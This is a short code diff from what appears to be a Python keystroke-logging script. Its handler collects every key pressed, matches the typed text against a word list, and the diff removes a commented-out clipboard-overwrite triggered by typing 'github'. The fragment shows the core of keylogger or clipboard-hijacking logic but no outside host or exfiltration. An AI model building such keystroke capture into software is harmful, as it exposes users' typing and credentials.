@@ -21,10 +21,7 @@ def on_press(key):
     global let_text
     let_text = str(let_text) + str(key)
     let_text = let_text.replace("'", '')
-    # if 'github' in let_text:
-    #     clip = 'TOKEN BITCH'
-    #     pyperclip.copy(clip)
-    #     spam = pyperclip.paste()
+
     #################################
     for thing in x:
         if thing in let_text:
